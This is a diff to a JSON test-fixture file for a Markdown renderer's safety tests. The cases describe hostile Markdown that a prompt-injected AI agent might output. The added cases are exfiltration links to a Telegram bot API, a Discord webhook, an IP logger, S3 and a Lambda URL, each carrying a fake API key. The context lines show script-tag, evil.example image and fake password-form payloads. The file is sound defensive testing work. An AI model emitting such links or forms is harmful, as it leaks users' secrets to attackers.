@@ -1,5 +1,5 @@
 {
-  "version": "2026-09-30",
+  "version": "2026-10-06",
   "description": "Hostile Markdown of the kind a prompt-injected agent produces, with the invariants a safe renderer must hold. Payload markers call p('<case id>') instead of doing harm. {{origin}} is replaced with the origin of the page under test.",
   "cases": [
     { "id": "script-tag", "category": "script-execution", "title": "<script> in Markdown", "input": "hi <script>p('script-tag')</script>",
@@ -64,6 +64,16 @@
       "expect": { "noRequestTo": ["evil.example"], "noElements": ["source"] } },
     { "id": "nested-image-link", "category": "exfiltration", "title": "image inside a link", "input": "[![img](https://evil.example/i.png)](https://evil.example/)",
       "expect": { "noRequestTo": ["evil.example"] } },
+    { "id": "link-sink-telegram-bot", "category": "exfiltration", "title": "link to a chat bot API that posts its query", "input": "[open the report](https://api.telegram.org/bot123456:AAH-x/sendMessage?chat_id=1&text=the%20api%20key%20is%20sk-live-1)",
+      "expect": { "noElements": ["a[href*=\"api.telegram.org\"]"], "mustContainText": ["open the report"] } },
+    { "id": "link-sink-discord-webhook", "category": "exfiltration", "title": "link to a versioned chat webhook", "input": "[confirm](https://discord.com/api/v10/webhooks/123/abc?content=sk-live-1)",
+      "expect": { "noElements": ["a[href*=\"discord.com\"]"], "mustContainText": ["confirm"] } },
+    { "id": "link-sink-ip-logger", "category": "exfiltration", "title": "link through an IP logger", "input": "[docs](https://grabify.link/ABC123)",
+      "expect": { "noElements": ["a[href*=\"grabify.link\"]"], "mustContainText": ["docs"] } },
+    { "id": "link-sink-s3-regional", "category": "exfiltration", "title": "link to a regional object-storage endpoint", "input": "[download](https://drop.s3.eu-west-1.amazonaws.com/c?d=sk-live-1)",
+      "expect": { "noElements": ["a[href*=\"amazonaws.com\"]"], "mustContainText": ["download"] } },
+    { "id": "link-sink-function-url", "category": "exfiltration", "title": "link to a serverless function URL", "input": "[details](https://abcd1234.lambda-url.us-east-1.on.aws/?k=sk-live-1)",
+      "expect": { "noElements": ["a[href*=\"on.aws\"]"], "mustContainText": ["details"] } },
 
     { "id": "form-password", "category": "ui-spoofing", "title": "password form inside the reply", "input": "<form action=\"https://evil.example/login\"><label>Session expired. Password: <input type=\"password\"></label><button>Sign in</button></form>",
       "expect": { "noElements": ["form", "input", "button"] } },
